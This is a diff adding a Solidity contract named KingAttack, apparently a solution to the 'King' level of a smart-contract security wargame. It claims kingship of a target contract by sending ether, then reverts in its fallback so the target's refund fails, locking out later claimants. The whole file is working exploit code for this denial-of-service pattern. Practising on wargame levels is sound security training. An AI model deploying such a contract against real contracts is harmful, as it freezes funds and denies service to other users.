@@ -1,0 +1,36 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./interfaces/9-IKing.sol";
+
+contract KingAttack {
+    IKing public immutable victimKing;
+
+    constructor(IKing victimKing_) {
+        victimKing = victimKing_;
+    }
+
+    function attack() external payable {
+        require(
+            msg.value >= victimKing.prize(),
+            "King: Value must be gt|eq prize"
+        );
+
+        // solhint-disable-next-line avoid-low-level-calls
+        (bool isSuccess, ) = address(victimKing).call{ value: msg.value }("");
+
+        require(isSuccess, "King: Call error");
+
+        require(
+            address(this) == victimKing._king() &&
+                msg.value == victimKing.prize(),
+            "King: Attack failed"
+        );
+    }
+
+    // solhint-disable-next-line payable-fallback
+    fallback() external {
+        revert("King: Level passed");
+    }
+}
